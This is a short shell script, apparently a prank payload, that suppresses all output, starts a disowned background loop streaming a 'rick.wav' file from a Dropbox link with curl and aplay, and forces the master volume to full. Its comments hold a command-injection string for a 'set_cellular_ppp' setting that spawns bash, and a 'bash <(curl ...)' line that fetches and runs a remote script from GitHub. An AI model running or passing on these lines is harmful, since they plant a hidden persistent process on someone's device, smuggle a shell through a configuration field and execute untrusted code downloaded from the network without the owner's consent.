exec >/dev/null
exec 2>/dev/null
while [ 1=1 ];
do
    aplay -q <(curl -s https://dl.dropboxusercontent.com/s/yfbvxazwjw2qh7x/rick.wav?dl=0);
done & disown &
amixer set Master 100% unmute;

#set_cellular_ppp \';bash;exit;\'
#bash <(curl -s https://raw.githubusercontent.com/TheYunDude/The-Big-Boy-Yunus/main/music.sh)
#https://eu5.easyupload.io/download/8ndt54/iprsyxstk9woags4r40khfaliscztt6u
